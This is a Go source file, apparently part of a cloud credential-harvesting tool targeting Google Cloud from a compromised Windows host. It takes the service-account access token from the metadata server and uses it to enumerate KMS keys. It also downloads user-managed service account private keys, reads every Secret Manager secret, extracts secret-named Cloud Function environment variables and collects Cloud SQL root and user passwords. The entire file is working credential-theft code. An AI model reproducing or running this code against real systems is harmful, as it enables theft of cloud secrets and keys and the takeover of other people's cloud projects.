//go:build windows

package main

import (
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"strings"
	"time"
)

// ── GCP Helpers ───────────────────────────────────────────────────────────────

func getGCPAccessToken(client *http.Client) string {
	req, _ := http.NewRequest("GET",
		"http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token", nil)
	req.Header.Set("Metadata-Flavor", "Google")
	resp, err := client.Do(req)
	if err != nil {
		return ""
	}
	defer resp.Body.Close()
	if resp.StatusCode != 200 {
		return ""
	}
	body, _ := io.ReadAll(resp.Body)
	var data struct {
		AccessToken string `json:"access_token"`
	}
	if json.Unmarshal(body, &data) != nil {
		return ""
	}
	return data.AccessToken
}

func getGCPProjectID(client *http.Client) string {
	req, _ := http.NewRequest("GET",
		"http://metadata.google.internal/computeMetadata/v1/project/project-id", nil)
	req.Header.Set("Metadata-Flavor", "Google")
	resp, err := client.Do(req)
	if err != nil {
		return ""
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)
	return strings.TrimSpace(string(body))
}

func getGCPDefaultServiceAccount(client *http.Client) string {
	req, _ := http.NewRequest("GET",
		"http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email", nil)
	req.Header.Set("Metadata-Flavor", "Google")
	resp, err := client.Do(req)
	if err != nil {
		return ""
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)
	return strings.TrimSpace(string(body))
}

func gcpAPICall(accessToken, method, url string) ([]byte, error) {
	req, _ := http.NewRequest(method, url, nil)
	req.Header.Set("Authorization", "Bearer "+accessToken)
	req.Header.Set("Content-Type", "application/json")

	client := &http.Client{Timeout: 10 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)
	if resp.StatusCode < 200 || resp.StatusCode >= 300 {
		return nil, fmt.Errorf("API error %d: %s", resp.StatusCode, string(body))
	}
	return body, nil
}

func gcpAPICallJSON(accessToken, method, url string, result interface{}) error {
	data, err := gcpAPICall(accessToken, method, url)
	if err != nil {
		return err
	}
	return json.Unmarshal(data, result)
}

// ── GCP KMS Key Listing ───────────────────────────────────────────────────────

func checkGCPKMS(accessToken, projectID string, r *CloudTokenResult) {
	if projectID == "" {
		r.Metadata["kms_error"] = "no project ID"
		return
	}

	// List key rings in global location
	url := fmt.Sprintf("https://cloudkms.googleapis.com/v1/projects/%s/locations/global/keyRings", projectID)
	var keyRings struct {
		KeyRings []struct {
			Name string `json:"name"`
		} `json:"keyRings"`
	}
	err := gcpAPICallJSON(accessToken, "GET", url, &keyRings)
	if err != nil {
		r.Metadata["kms_error"] = err.Error()
		return
	}

	for _, kr := range keyRings.KeyRings {
		// List crypto keys in key ring
		keysURL := kr.Name + "/cryptoKeys"
		var cryptoKeys struct {
			CryptoKeys []struct {
				Name    string `json:"name"`
				Purpose string `json:"purpose"`
				Primary struct {
					State string `json:"state"`
				} `json:"primary"`
			} `json:"cryptoKeys"`
		}
		err := gcpAPICallJSON(accessToken, "GET", keysURL, &cryptoKeys)
		if err != nil {
			continue
		}

		for _, ck := range cryptoKeys.CryptoKeys {
			r.Tokens = append(r.Tokens, CloudToken{
				Type:     "gcp_kms_key",
				Resource: ck.Name,
				Value:    fmt.Sprintf("Purpose=%s, State=%s", ck.Purpose, ck.Primary.State),
			})
		}
	}
}

// ── GCP Service Account Key Extraction ────────────────────────────────────────

func checkGCPServiceAccountKeys(accessToken, projectID string, r *CloudTokenResult) {
	if projectID == "" {
		return
	}

	// List service accounts
	url := fmt.Sprintf("https://iam.googleapis.com/v1/projects/%s/serviceAccounts", projectID)
	var saList struct {
		Accounts []struct {
			Name  string `json:"name"`
			Email string `json:"email"`
		} `json:"accounts"`
	}
	err := gcpAPICallJSON(accessToken, "GET", url, &saList)
	if err != nil {
		r.Metadata["sa_keys_error"] = err.Error()
		return
	}

	for _, sa := range saList.Accounts {
		r.Metadata["service_account"] = sa.Email

		// List keys for each SA
		keysURL := sa.Name + "/keys"
		var keysList struct {
			Keys []struct {
				Name            string `json:"name"`
				KeyType         string `json:"keyType"`
				ValidAfterTime  string `json:"validAfterTime"`
				ValidBeforeTime string `json:"validBeforeTime"`
			} `json:"keys"`
		}
		err := gcpAPICallJSON(accessToken, "GET", keysURL, &keysList)
		if err != nil {
			continue
		}

		for _, key := range keysList.Keys {
			if key.KeyType == "USER_MANAGED" {
				// Download the key (only possible for user-managed keys)
				downloadURL := key.Name + ":download"
				var keyData struct {
					PrivateKeyData string `json:"privateKeyData"`
				}
				err := gcpAPICallJSON(accessToken, "POST", downloadURL, &keyData)
				if err != nil {
					r.Metadata[fmt.Sprintf("sa_key_dl_error_%s", key.Name)] = err.Error()
					continue
				}
				r.Tokens = append(r.Tokens, CloudToken{
					Type:     "gcp_service_account_key",
					Resource: fmt.Sprintf("iam:%s/key:%s", sa.Email, key.Name),
					Value:    keyData.PrivateKeyData,
				})
			} else {
				// System-managed key metadata
				r.Metadata[fmt.Sprintf("sa_system_key_%s", sa.Email)] = key.Name
			}
		}
	}
}

// ── GCP Secret Manager Enumeration ────────────────────────────────────────────

func checkGCPSecretManager(accessToken, projectID string, r *CloudTokenResult) {
	if projectID == "" {
		return
	}

	// List secrets
	url := fmt.Sprintf("https://secretmanager.googleapis.com/v1/projects/%s/secrets", projectID)
	var secretsList struct {
		Secrets []struct {
			Name   string            `json:"name"`
			Labels map[string]string `json:"labels,omitempty"`
		} `json:"secrets"`
	}
	err := gcpAPICallJSON(accessToken, "GET", url, &secretsList)
	if err != nil {
		r.Metadata["secretmanager_error"] = err.Error()
		return
	}

	for _, secret := range secretsList.Secrets {
		// Access latest version
		accessURL := secret.Name + "/versions/latest:access"
		var versionData struct {
			Payload struct {
				Data string `json:"data"`
			} `json:"payload"`
		}
		err := gcpAPICallJSON(accessToken, "GET", accessURL, &versionData)
		if err != nil {
			// Try listing versions
			versionsURL := secret.Name + "/versions"
			var versionsList struct {
				Versions []struct {
					Name  string `json:"name"`
					State string `json:"state"`
				} `json:"versions"`
			}
			if gcpAPICallJSON(accessToken, "GET", versionsURL, &versionsList) != nil {
				continue
			}
			for _, v := range versionsList.Versions {
				if v.State != "ENABLED" {
					continue
				}
				accessURL := v.Name + ":access"
				if gcpAPICallJSON(accessToken, "GET", accessURL, &versionData) != nil {
					continue
				}
				break
			}
			if versionData.Payload.Data == "" {
				continue
			}
		}

		r.Tokens = append(r.Tokens, CloudToken{
			Type:     "gcp_secretmanager",
			Resource: secret.Name,
			Value:    versionData.Payload.Data,
		})
	}
}

// ── GCP Cloud Function Environment Extraction ─────────────────────────────────

func checkGCPCloudFunctions(accessToken, projectID string, r *CloudTokenResult) {
	if projectID == "" {
		return
	}

	// List Cloud Functions (v1)
	url := fmt.Sprintf("https://cloudfunctions.googleapis.com/v1/projects/%s/locations/-/functions", projectID)
	var functions struct {
		Functions []struct {
			Name                 string            `json:"name"`
			EntryPoint           string            `json:"entryPoint"`
			Runtime              string            `json:"runtime"`
			EnvironmentVariables map[string]string `json:"environmentVariables,omitempty"`
		} `json:"functions"`
	}
	err := gcpAPICallJSON(accessToken, "GET", url, &functions)
	if err != nil {
		r.Metadata["functions_error"] = err.Error()
		return
	}

	for _, fn := range functions.Functions {
		if fn.EnvironmentVariables != nil {
			filtered := make(map[string]string)
			for k, v := range fn.EnvironmentVariables {
				kl := strings.ToLower(k)
				if strings.Contains(kl, "secret") ||
					strings.Contains(kl, "password") ||
					strings.Contains(kl, "key") ||
					strings.Contains(kl, "token") ||
					strings.Contains(kl, "conn") {
					filtered[k] = v
				}
			}
			if len(filtered) > 0 {
				envJSON, _ := json.Marshal(filtered)
				r.Tokens = append(r.Tokens, CloudToken{
					Type:     "gcp_cloudfunction_env",
					Resource: fn.Name,
					Value:    string(envJSON),
				})
			}
		}
	}

	// Also try Cloud Functions v2
	url2 := fmt.Sprintf("https://cloudfunctions.googleapis.com/v2/projects/%s/locations/-/functions", projectID)
	var functions2 struct {
		Functions []struct {
			Name          string `json:"name"`
			ServiceConfig struct {
				EnvironmentVariables map[string]string `json:"environmentVariables,omitempty"`
			} `json:"serviceConfig"`
		} `json:"functions"`
	}
	err2 := gcpAPICallJSON(accessToken, "GET", url2, &functions2)
	if err2 == nil {
		for _, fn := range functions2.Functions {
			if fn.ServiceConfig.EnvironmentVariables != nil {
				for k, v := range fn.ServiceConfig.EnvironmentVariables {
					kl := strings.ToLower(k)
					if strings.Contains(kl, "secret") ||
						strings.Contains(kl, "password") ||
						strings.Contains(kl, "key") ||
						strings.Contains(kl, "token") {
						r.Tokens = append(r.Tokens, CloudToken{
							Type:     "gcp_cloudfunction_v2_env",
							Resource: fn.Name,
							Value:    fmt.Sprintf("%s=%s", k, v),
						})
					}
				}
			}
		}
	}
}

// ── GCP Cloud SQL Connection Info ─────────────────────────────────────────────

func checkGCPCloudSQL(accessToken, projectID string, r *CloudTokenResult) {
	if projectID == "" {
		return
	}

	// List Cloud SQL instances
	url := fmt.Sprintf("https://sqladmin.googleapis.com/v1/projects/%s/instances", projectID)
	var instances struct {
		Items []struct {
			Name            string `json:"name"`
			DatabaseVersion string `json:"databaseVersion"`
			ConnectionName  string `json:"connectionName"`
			Region          string `json:"region"`
			RootPassword    string `json:"rootPassword,omitempty"`
			Settings        struct {
				UserLabels      map[string]string `json:"userLabels,omitempty"`
				IpConfiguration struct {
					PrivateNetwork string `json:"privateNetwork,omitempty"`
				} `json:"ipConfiguration"`
			} `json:"settings"`
		} `json:"items"`
	}
	err := gcpAPICallJSON(accessToken, "GET", url, &instances)
	if err != nil {
		r.Metadata["cloudsql_error"] = err.Error()
		return
	}

	for _, inst := range instances.Items {
		info := fmt.Sprintf("Version=%s, ConnectionName=%s, Region=%s",
			inst.DatabaseVersion, inst.ConnectionName, inst.Region)
		if inst.RootPassword != "" {
			info += fmt.Sprintf(", RootPassword=%s", inst.RootPassword)
		}

		r.Tokens = append(r.Tokens, CloudToken{
			Type:     "gcp_cloudsql_instance",
			Resource: fmt.Sprintf("cloudsql:%s", inst.Name),
			Value:    info,
		})

		// Try to list databases and users for this instance
		usersURL := fmt.Sprintf("https://sqladmin.googleapis.com/v1/projects/%s/instances/%s/users", projectID, inst.Name)
		var users struct {
			Items []struct {
				Name     string `json:"name"`
				Host     string `json:"host,omitempty"`
				Password string `json:"password,omitempty"`
			} `json:"items"`
		}
		if gcpAPICallJSON(accessToken, "GET", usersURL, &users) == nil {
			for _, u := range users.Items {
				userInfo := fmt.Sprintf("User=%s", u.Name)
				if u.Host != "" {
					userInfo += fmt.Sprintf(", Host=%s", u.Host)
				}
				if u.Password != "" {
					userInfo += fmt.Sprintf(", Password=%s", u.Password)
					r.Tokens = append(r.Tokens, CloudToken{
						Type:     "gcp_cloudsql_user_password",
						Resource: fmt.Sprintf("cloudsql:%s/user:%s", inst.Name, u.Name),
						Value:    fmt.Sprintf("%s/%s:%s", inst.Name, u.Name, u.Password),
					})
				}
			}
		}

		databasesURL := fmt.Sprintf("https://sqladmin.googleapis.com/v1/projects/%s/instances/%s/databases", projectID, inst.Name)
		var databases struct {
			Items []struct {
				Name string `json:"name"`
			} `json:"items"`
		}
		if gcpAPICallJSON(accessToken, "GET", databasesURL, &databases) == nil {
			var dbNames []string
			for _, d := range databases.Items {
				dbNames = append(dbNames, d.Name)
			}
			r.Metadata[fmt.Sprintf("cloudsql_databases_%s", inst.Name)] = strings.Join(dbNames, ", ")
		}
	}
}

// ── GCP Main Entry Point ──────────────────────────────────────────────────────

func checkGCPAll(client *http.Client, r *CloudTokenResult) {
	token := getGCPAccessToken(client)
	if token == "" {
		r.Metadata["gcp_note"] = "No access token available"
		return
	}

	projectID := getGCPProjectID(client)
	saEmail := getGCPDefaultServiceAccount(client)

	if projectID != "" {
		r.Metadata["project_id"] = projectID
	}
	if saEmail != "" {
		r.Metadata["service_account_email"] = saEmail
	}

	r.Tokens = append(r.Tokens, CloudToken{
		Type:     "gcp_access_token",
		Resource: "default",
		Value:    token,
	})

	// Run all GCP checks
	checkGCPKMS(token, projectID, r)
	checkGCPServiceAccountKeys(token, projectID, r)
	checkGCPSecretManager(token, projectID, r)
	checkGCPCloudFunctions(token, projectID, r)
	checkGCPCloudSQL(token, projectID, r)
}
